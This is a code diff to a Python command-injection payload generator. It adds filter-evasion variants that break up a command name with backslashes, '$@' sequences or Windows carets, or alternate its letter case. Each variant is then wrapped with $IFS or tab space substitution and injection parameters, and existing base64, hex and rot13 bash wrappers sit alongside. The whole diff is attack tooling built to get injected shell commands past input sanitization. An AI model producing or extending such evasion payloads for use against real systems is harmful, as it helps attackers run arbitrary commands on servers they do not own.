@@ -2,6 +2,7 @@ import sys
 import base64
 import binascii
 import codecs
+import random
 from colorama import *
 
 
@@ -19,6 +20,10 @@ def print_info(message):
 
 def print_payload(message):
     return f"{Fore.CYAN}{message}{Style.RESET_ALL}"
+
+
+def randomize_case(commandName):
+    return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(commandName))
 
 
 def is_int(value):
@@ -111,6 +116,65 @@ def runL2_simpleQuote(payloads: list, cmd: str):
         payloads.append(replaceSlashs(replaceSpaces_09(c)))
 
 
+def runL2_antislash(payloads: list, cmd: str):
+    command = cmd.split(" ")
+    commandName = command[0]
+
+    if len(commandName) > 2:
+        commandName = commandName[0] + ''.join(['\\' + char + '\\' for char in commandName[1:-1]]) + commandName[-1]
+
+    command[0] = commandName
+    command = ' '.join(command)
+    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
+    for c in cmds:
+        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
+        payloads.append(replaceSlashs(replaceSpaces_09(c)))
+
+
+def runL2_linuxspecial(payloads: list, cmd: str):
+    command = cmd.split(" ")
+    commandName = command[0]
+
+    if len(commandName) > 2:
+        commandName = commandName[0] + ''.join(['$@' + char + '$@' for char in commandName[1:-1]]) + commandName[-1]
+
+    command[0] = commandName
+    command = ' '.join(command)
+    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
+    for c in cmds:
+        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
+        payloads.append(replaceSlashs(replaceSpaces_09(c)))
+
+
+def runL2_windowsspecial(payloads: list, cmd: str):
+    command = cmd.split(" ")
+    commandName = command[0]
+
+    if len(commandName) > 2:
+        commandName = commandName[0] + ''.join(['^' + char + '^' for char in commandName[1:-1]]) + commandName[-1]
+
+    command[0] = commandName
+    command = ' '.join(command)
+    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
+    for c in cmds:
+        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
+        payloads.append(replaceSlashs(replaceSpaces_09(c)))
+
+
+def runL2_upperlower(payloads: list, cmd: str):
+    command = cmd.split(" ")
+    commandName = command[0]
+
+    commandName = randomize_case(commandName)
+
+    command[0] = commandName
+    command = ' '.join(command)
+    cmds = pushInjectionParameter(command)
+    for c in cmds:
+        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
+        payloads.append(replaceSlashs(replaceSpaces_09(c)))
+
+
 def runL3_base64(payloads: list, cmd: str):
     # bash<<<$(base64 -d<<< <cmd encoded base64>)
     command = cmd.split(" ")
@@ -198,6 +262,7 @@ def runL3_rot13_IFS(payloads: list, cmd: str):
     for c in cmds:
         payloads.append(c)
 
+
 def runL3_rot13_09(payloads: list, cmd: str):
     # bash<<<$(tr '[A-Za-z]' '[N-ZA-Mn-za-m]'<<< <cmd encoded hexa>)
     command = cmd.split(" ")
@@ -226,6 +291,7 @@ def runL3_rot13_09(payloads: list, cmd: str):
     cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
     for c in cmds:
         payloads.append(c)
+
 
 def main():
     init()
@@ -296,6 +362,10 @@ def main():
         print_info("Generating payloads for level 2.")
         runL2_doubleQuote(payloads, cmd)
         runL2_simpleQuote(payloads, cmd)
+        runL2_antislash(payloads, cmd)
+        runL2_linuxspecial(payloads, cmd)
+        runL2_windowsspecial(payloads, cmd)
+        runL2_upperlower(payloads, cmd)
         print_info("Payloads (level 2) generated with success !")
 
     if level == 3:
